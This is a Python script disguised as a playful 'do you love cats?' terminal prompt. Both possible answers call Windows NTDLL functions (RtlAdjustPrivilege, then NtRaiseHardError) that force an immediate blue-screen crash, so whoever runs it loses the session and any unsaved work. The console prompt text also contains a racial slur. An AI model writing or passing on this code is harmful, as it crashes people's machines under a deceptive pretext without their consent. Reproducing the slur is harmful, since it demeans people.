import os
import ctypes
import colorama
import fade
from colorama import Fore

colorama.init(autoreset=True)

clear_command = "cls" if os.name == "nt" else "clear"


while True:
    os.system(clear_command)
    print (Fore.RED + "root@trusty: " + Fore.WHITE + "DO YOU LOVE CATS? >^•-•^< (Y/N)")
    try:
        answer = input(Fore.RED + "root@nigga:~$ " + Fore.WHITE).strip().upper()
    except KeyboardInterrupt:
        print("")
        continue
    
    if answer == 'Y':
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint(100)))
        break  
    elif answer == 'N':
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint(100)))
        break 
    else:
        print(Fore.WHITE + "root@trusty: " + Fore.RED + "Bro Just say 'Y' or 'N'.")

try:
    input(Fore.RED + "root@trusty: " + Fore.RED + "Press Enter to continue.")
except KeyboardInterrupt:
    pass
